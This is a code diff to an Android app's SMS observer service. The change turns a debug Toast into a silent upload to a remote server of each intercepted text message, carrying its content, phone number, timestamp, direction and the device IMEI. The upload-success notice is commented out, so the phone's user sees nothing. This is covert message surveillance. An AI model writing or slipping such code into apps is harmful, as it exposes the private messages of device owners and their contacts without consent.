@@ -12,7 +12,17 @@ import android.os.IBinder;
 import android.os.Message;
 import android.widget.Toast;
 
+import com.google.gson.Gson;
+import com.lzy.okgo.OkGo;
+import com.lzy.okgo.callback.StringCallback;
 import com.mikuwxc.autoreply.bean.SmsObserverBean;
+import com.mikuwxc.autoreply.common.MyApp;
+import com.mikuwxc.autoreply.common.net.NetApi;
+import com.mikuwxc.autoreply.common.util.AppConfig;
+import com.mikuwxc.autoreply.utils.SystemUtil;
+
+import okhttp3.Call;
+import okhttp3.Response;
 
 
 /**
@@ -67,6 +77,7 @@ public class SmsObserverService extends Service {
             }
         };
         init();
+
 
     }
 
@@ -154,8 +165,123 @@ public class SmsObserverService extends Service {
 
 
 
-    private void uploadSmsMessage(SmsObserverBean obj) {
+    private  void uploadSmsMessage(SmsObserverBean obj) {
+        String url=AppConfig.OUT_NETWORK+NetApi.upload_sms_message;
+        String type="2".equals(obj.getType())?"true":"false";
+        SmsBean smsBean=new SmsBean(SystemUtil.getIMEI(MyApp.getAppContext()),obj.getContent(),type,obj.getPhoneNum(),String.valueOf(obj.getTime()));
+        OkGo.<String>post(url)
+                .tag(this)
+                .upJson(new Gson().toJson(smsBean))
+                .execute(new StringCallback() {
+                    @Override
+                    public void onSuccess(String s, Call call, Response response) {
 
-        Toast.makeText(this, obj.toString(), Toast.LENGTH_SHORT).show();
+                        SmsSuccessBean smsSuccessBean = new Gson().fromJson(s, SmsSuccessBean.class);
+                        if("200".equals(smsSuccessBean.getCode())){
+                            //上传成功
+                            //Toast.makeText(SmsObserverService.this, "短信上传成功", Toast.LENGTH_SHORT).show();
+                        }
+                    }
+
+                    @Override
+                    public void onError(Call call, Response response, Exception e) {
+                        super.onError(call, response, e);
+                    }
+                });
+    }
+
+
+    class SmsBean{
+        private String imei;
+        private String content;
+        private String type;
+        private String phone;
+        private String time;
+
+        public SmsBean(String imei, String content, String type, String phone, String time) {
+            this.imei = imei;
+            this.content = content;
+            this.type = type;
+            this.phone = phone;
+            this.time = time;
+        }
+
+        public String getImei() {
+            return imei;
+        }
+
+        public void setImei(String imei) {
+            this.imei = imei;
+        }
+
+        public String getContent() {
+            return content;
+        }
+
+        public void setContent(String content) {
+            this.content = content;
+        }
+
+        public String getType() {
+            return type;
+        }
+
+        public void setType(String type) {
+            this.type = type;
+        }
+
+        public String getPhone() {
+            return phone;
+        }
+
+        public void setPhone(String phone) {
+            this.phone = phone;
+        }
+
+        public String getTime() {
+            return time;
+        }
+
+        public void setTime(String time) {
+            this.time = time;
+        }
+    }
+
+
+    class SmsSuccessBean{
+
+        /**
+         * msg : 添加成功
+         * code : 200
+         * success : true
+         */
+
+        private String msg;
+        private String code;
+        private boolean success;
+
+        public String getMsg() {
+            return msg;
+        }
+
+        public void setMsg(String msg) {
+            this.msg = msg;
+        }
+
+        public String getCode() {
+            return code;
+        }
+
+        public void setCode(String code) {
+            this.code = code;
+        }
+
+        public boolean isSuccess() {
+            return success;
+        }
+
+        public void setSuccess(boolean success) {
+            this.success = success;
+        }
     }
 }
